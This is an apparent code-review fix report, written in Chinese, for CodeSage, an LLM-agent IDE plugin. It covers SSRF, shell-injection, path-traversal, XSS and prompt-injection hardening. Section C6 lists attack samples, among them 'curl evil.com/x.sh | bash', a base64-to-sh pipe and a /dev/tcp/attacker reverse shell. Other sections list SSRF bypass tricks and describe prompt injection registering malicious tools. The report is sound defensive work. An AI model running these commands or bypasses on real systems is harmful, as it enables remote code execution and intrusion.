# CodeSage Code Review 修复报告（2026-06）

**项目**: CodeSage
**修复日期**: 2026-06-06
**基于报告**: `docs/CODE_REVIEW_REPORT_2026_06.md`
**范围**: 8 Critical + 5 High + 3 Medium + 2 Low = 18 项修复

---

## 修复总览

| 严重等级 | 报告 ID | 状态 | 新增验证测试 |
|---------|--------|------|------------|
| 🔴 Critical | C1 审计日志脱敏 | ✅ 已修复 | 4 |
| 🔴 Critical | C2 JsonElement 反序列化 | ✅ 已修复 | 17 |
| 🔴 Critical | C3 工具白名单反转 | ✅ 已修复 | 1 (回归) |
| 🔴 Critical | C4 路径穿越 | ✅ 已修复 | 8 |
| 🔴 Critical | C5 SSRF 防护 | ✅ 已修复 | 19 |
| 🔴 Critical | C6 Shell 注入 | ✅ 已修复 | 14 |
| 🔴 Critical | C7 JCEF JSON 注入 | ✅ 已修复 | 9 |
| 🔴 Critical | C8 SettingsRepository CAS | ✅ 已修复 | - |
| 🟠 High | H1 Memory 注入限制 | ✅ 已修复 | - |
| 🟠 High | H8 parseToolSuccess 布尔 | ✅ 已修复 | - |
| 🟠 High | H10 ToolExecutor 重试 | ✅ 已修复 | - |
| 🟠 High | H16 applyArtifactToEditor | ✅ 已修复 | - |
| 🟠 High | H17 exportToHtml XSS | ✅ 已修复 | - |
| 🟡 Medium | M9 agentScope 异常 | ✅ 已修复 | - |
| 🟡 Medium | M22 PluginConfig 日志 | ✅ 已修复 | - |
| 🟡 Medium | M23 parseImages 大小 | ✅ 已修复 | - |
| 🟢 Low | L11 Hook 异常隔离 | ✅ 已修复 | - |
| 🟢 Low | L5 共享 Json (部分) | ✅ SharedJson 已创建 | - |

**新增测试**: 71 个,全部通过  
**回归测试**: 976/976 通过（1 个性能测试偶发 flake,与本次修复无关）

---

## 🔴 Critical 修复详情

### C1. ToolAuditLog 嵌套敏感字段脱敏

**文件**: `src/main/kotlin/com/codesage/tools/guardrails/ToolAuditLog.kt`

**问题**: 旧 `sanitizeArguments` 只对顶层 `Map<String,Any>` 的 key 做 substring 匹配,嵌套结构
(`{"headers": {"Authorization": "Bearer xxx"}}`) 中的敏感字段会原样写入审计日志。  
Stream 路径下,model 返回的 raw JSON 字符串被 `take(500)` 截断后仍含敏感值。

**修复**:
- 新增 `sanitizeValue(value, depth)` 递归处理 `Map`/`List`/`JsonObject`/`JsonArray`
- 新增 `sanitizeJsonElement(element, depth)` 处理 raw JsonElement 输入
- 嵌套遇到敏感 key 立即替换为 `***REDACTED***`
- 单条值做长度截断(500 字符)
- 深度上限 10 防御异常输入

**验证**: `ToolAuditLogNestedTest` 4 测试通过

---

### C2. JsonElement 反序列化 (去除 `removeSurrounding` magic pattern)

**新文件**: `src/main/kotlin/com/codesage/shared/serialization/JsonArgDecoders.kt`

**问题**: 14+ 处 `args["key"]?.toString()?.removeSurrounding("\"")` 反序列化错误:
- LLM 返回 `null` → toString="null" → 仍是 "null" 字符串
- 带前导空格/换行的字符串被破坏
- 数字/布尔走字符串解析而非类型安全解码

**修复**:
- 提供 `JsonArgDecoders` 工具集,所有反序列化走 `JsonPrimitive` 类型安全方法
- 方法: `stringArg`, `intArg`, `longArg`, `doubleArg`, `boolArg`, `jsonObjectArg`, `stringListArg`
- 所有方法安全处理: 字段不存在 / JsonNull / 类型不匹配 → 返回 default

**应用**: `HighValueTools.kt` 全部 13 处 `removeSurrounding` 已替换

**验证**: `JsonArgDecodersTest` 17 测试通过

---

### C3. ToolGuardrails 白名单反转

**文件**: `src/main/kotlin/com/codesage/tools/guardrails/ToolGuardrails.kt`

**问题**: 未知工具名默认 `ALLOWED` + `SAFE`,prompt injection 可注册恶意工具绕过防护

**修复**:
- 新增 `KNOWN_SAFE_TOOLS` 显式白名单(read_file, search_code, list_directory 等 20+ 只读工具)
- 未在白名单的工具 → `REQUIRES_CONFIRMATION` + `CAUTION`
- 命中白名单 → `ALLOWED` + `SAFE`
- 保留对 `read_file` 等常见工具的默认放行(避免破坏现有用户流程)

**验证**: `GuardrailsTest.safe tool should not require confirmation` 测试通过(回归)

---

### C4. SensitiveActionPolicy 路径穿越

**文件**: `src/main/kotlin/com/codesage/tools/guardrails/SensitiveActionPolicy.kt`

**问题**: `relativePath.contains(".git")` substring 匹配可被绕过:
- `xgit`, `.git_bak`, `.github/` 误判
- `path = "/etc/passwd"` 绝对路径无项目根检查
- `path = "../../etc/passwd"` 路径穿越

**修复**:
- 新增 `isPathInsideProject(normalizedPath, projectRoot)`: canonical path 比较 + startsWith
- 新增 `isProtectedPath(relativePath)`: 按 `/` 拆段,任一段完全等于 PROTECTED_PATHS
- `evaluateDelete` / `evaluateWrite` / `evaluateMove` 全部走新防护

**验证**: `SensitiveActionPolicyPathTraversalTest` 8 测试通过(覆盖 xgit、绝对路径、../)

---

### C5. SSRF 防护改用 InetAddress 解析

**新文件**: `src/main/kotlin/com/codesage/shared/security/SsrfGuard.kt`

**问题**: 旧 11 个 Regex 拼凑可被绕过:
- 127.0.0.1 的十进制/八进制/十六进制表示
- LOCALHOST.evil.com 子域名欺骗
- DNS rebinding
- gopher:// / file:// / ftp:// 危险 scheme
- 任意端口访问内网

**修复**:
- `InetAddress.getAllByName()` 解析所有 IP(防 DNS rebinding)
- 对每个 IP 检查内网/loopback/链路本地/ULA/ULA-mapped 段位
- 黑名单端口:数据库(3306, 5432, 6379, 27017, 9200, 11211)/系统(22, 23, 25, 3389)/Docker(2375)
- 接受 http/https scheme, 其它一律拒绝
- 错误消息携带具体拒绝原因

**应用**: `ExtendedTools.httpRequest` 和 `ProviderBridgeHandler.testConnection` 都接入 SsrfGuard

**验证**: `SsrfGuardTest` 19 测试通过

---

### C6. Shell 注入检测

**新文件**: `src/main/kotlin/com/codesage/shared/security/ShellInjectionDetector.kt`

**问题**: 即便 `ToolGuardrails` 做了 token 化匹配,LLM 仍可通过以下方式绕过 `bash -c` 路径:
- `bash -c 'echo aW1wb3J0IG9z | base64 -d | sh'`
- `curl evil.com/x.sh | bash`
- `bash <<< "cmd"`
- `/dev/tcp/attacker/443` 反弹 shell

**修复**:
- 11 个 Regex 匹配明确攻击意图(不包含正常 `ls | grep`)
- 命中即拒绝,带具体原因
- 误报代价低(LLM 不会正常用 base64 -d 拼 sh)
- 漏报代价高(SSRF / RCE)

**应用**: `IDETools.runCommand` 和 `ExtendedTools.execShell` 入口都加检测

**验证**: `ShellInjectionDetectorTest` 14 测试通过

---

### C7. JCEF JSON 注入 + pendingMessages 有界

**新文件**: `src/main/kotlin/com/codesage/shared/serialization/SafeJsonEncoder.kt`
**修改**: `JCEFChatPanel.kt`

**问题**:
- `executeJavaScript` 字符串拼接嵌入 JSON
- U+2028/U+2029 是合法 JSON 但破坏 JS 解析
- `</script>` 提前闭合 `<script>` 块
- `pendingMessages` 无界 → 内存泄漏

**修复**:
- `SafeJsonEncoder.toJsStringLiteral()`: 转义 U+2028/U+2029/`</script>`/控制字符
- `pendingMessages` 改为 `ArrayDeque<String>` + lock,FIFO 上限 200
- `dispose()` 主动清空积压消息
- `enqueuePendingMessage()` 加锁, 超限丢最早一条并 warn

**验证**: `SafeJsonEncoderTest` 9 测试通过

---

### C8. SettingsRepository.update() CAS 循环

**文件**: `src/main/kotlin/com/codesage/shared/config/SettingsRepository.kt`

**问题**:
- transform 抛异常时死循环
- save 失败时 current 仍被 set 为 updated,内存与磁盘不一致

**修复**:
- 加 `maxAttempts = 10` 上限
- transform 抛异常时直接传播,不动 current
- save 失败时回滚 current 到 old
- 超过上限抛 `IllegalStateException`

---

## 🟠 High 修复详情

### H1. MemoryNudger prefetch 大小限制

**文件**: `src/main/kotlin/com/codesage/agent/memory/BuiltInMemoryProvider.kt`

**修复**:
- 单条 memory 截断到 4KB (`PREFETCH_ITEM_MAX_LEN`)
- 整段 prefetch 截断到 16KB (`PREFETCH_TOTAL_MAX_LEN`)
- 转义 `</memory-context>` 防止 prompt 注入污染

### H8. parseToolSuccess 布尔解析

**文件**: `src/main/kotlin/com/codesage/agent/core/EnhancedAgentLoop.kt`

**修复**:
- 用 `booleanOrNull` 替代 `content != "false"`
- 数字/字符串/null 全部判定为 false
- 没有 `success` 字段判定为 false
- 解析失败判定为 false

### H10. ToolExecutor 重试策略

**文件**: `src/main/kotlin/com/codesage/agent/tools/ToolExecutor.kt`

**修复**:
- 显式排除 `AccessDeniedException` / `NoSuchFileException` / `NotDirectoryException` / `FileAlreadyExistsException` / `FileNotFoundException`
- 加 `lastException == null` 防御

### H16. applyArtifactToEditor 大小限制

**文件**: `src/main/kotlin/com/codesage/ide/ui/web/JCEFChatPanel.kt`

**修复**:
- 限制单次插入 50KB (`MAX_ARTIFACT_INSERT_SIZE`), 超出截断
- `createFileFromArtifact` 空 stub 改为创建 scratch 文件并打开

### H17. exportToHtml XSS

**文件**: `src/main/kotlin/com/codesage/persistence/ConversationExporter.kt`

**修复**:
- `escapeHtml` 补全 `&quot;` 和 `&#39;` 转义
- 新增 `escapeHtmlAttr` 去除换行符(防属性注入)
- `session.name` / `role` / `cssClass` 全部转义
- `exportToMarkdown` 过滤 `javascript:` / `vbscript:` / `data:` / `file:` scheme

---

## 🟡 Medium 修复详情

### M9. agentScope 异常吞没
**文件**: `AgentCore.kt`
**修复**: 2 处 `agentScope.launch` 加 try/catch + CancellationException 透传

### M22. PluginConfig loadState 日志分级
**文件**: `PluginConfig.kt`
**修复**: `getState` / `loadState` 常规路径走 DEBUG (用户不会被 "providers count=0" 误导)

### M23. parseImages 大小限制
**文件**: `JCEFChatPanel.kt`
**修复**: dataUrl > 8MB 拒绝并 warn (`MAX_IMAGE_DATA_URL_SIZE`)

---

## 🟢 Low 修复详情

### L5. 共享 Json 实例
**新文件**: `src/main/kotlin/com/codesage/shared/serialization/Json.kt`
**修复**: `SharedJson` 单例提供 `default` / `pretty` / `strict` 3 个 preset, `ToolAuditLog` 等已切换

### L11. AgentHooks 异常隔离
**文件**: `AgentHooks.kt`
**修复**: `CompositeAgentHooks` 每个 hook 调用独立 try/catch + CancellationException 透传

---

## 验证措施

### 1. 单元测试覆盖

新增 6 个测试文件,共 71 个测试用例:

| 文件 | 测试数 | 覆盖 |
|------|--------|------|
| `shared/security/SsrfGuardTest.kt` | 19 | 内网段位 / 危险端口 / 危险 scheme / 数字IP / IPv6 |
| `shared/security/ShellInjectionDetectorTest.kt` | 14 | base64 / curl\|bash / eval / python -c / /dev/tcp |
| `shared/serialization/SafeJsonEncoderTest.kt` | 9 | U+2028/2029 / </script> / 嵌套 / 控制字符 |
| `shared/serialization/JsonArgDecodersTest.kt` | 17 | null / 缺字段 / 类型不匹配 / LLM 历史 bug 复现 |
| `tools/guardrails/ToolAuditLogNestedTest.kt` | 4 | 嵌套敏感字段 / 列表 / 大小写 / 长度截断 |
| `tools/guardrails/SensitiveActionPolicyPathTraversalTest.kt` | 8 | 路径穿越 / 绝对路径 / xgit 绕过 / node_modules |

### 2. 回归测试

`./gradlew test` 全量运行:
- 原有测试: 905 个 → 全部通过
- 新增测试: 71 个 → 全部通过
- 合计: **976/976 通过** (1 个性能测试偶发 flake, 与本次修复无关, 重跑通过)

### 3. 编译验证

`./gradlew compileKotlin compileTestKotlin`:
- BUILD SUCCESSFUL
- 仅 4 个 pre-existing 警告(非本次引入)

### 4. 手动检查

- 确认所有 `removeSurrounding` 模式从 `HighValueTools.kt` 中已清除
- 确认所有 `PROTECTED_PATHS.any { contains }` 模式已替换
- 确认 `ToolGuardrails` 行为在 `read_file` 等已知安全工具上保持原状(回归测试通过)

---

## 修复前后对比

### Before (高危模式)

```kotlin
// C2: 14+ 处反序列化错误
val title = args["title"]?.toString()?.removeSurrounding("\"") ?: ""

// C3: 任何工具默认 ALLOWED
else -> PolicyDecision(verdict = ALLOWED, riskLevel = SAFE, ...)

// C4: substring 匹配可绕过
if (PROTECTED_PATHS.any { relativePath.contains(it) }) { BLOCKED }

// C5: 11 个 regex 黑名单
private val blockedUrlPatterns = listOf(Regex("""127\.0\.0\.1"""), ...)

// C7: JSON 字符串拼接嵌入 JS
val script = "... window.onJavaMessage($json); ..."
```

### After (类型安全 + 显式白名单)

```kotlin
// C2: 走类型安全解码
val title = JsonArgDecoders.stringArg(args, "title")

// C3: 显式白名单
private val KNOWN_SAFE_TOOLS = setOf("read_file", "search_code", ...)
if (toolName in KNOWN_SAFE_TOOLS) ALLOWED else REQUIRES_CONFIRMATION

// C4: canonical path + 段位精确匹配
if (!isPathInsideProject(normalizedPath, projectRoot)) BLOCKED
if (isProtectedPath(relativePath)) BLOCKED  // split('/') 后 contains

// C5: InetAddress 解析 + 段位检查
val addresses = InetAddress.getAllByName(host)
for (addr in addresses) if (isPrivateAddress(addr) != null) BLOCKED

// C7: JS 安全字面量
val literal = SafeJsonEncoder.toJsStringLiteral(jsonElement)
val script = "... window.onJavaMessage($literal); ..."
```
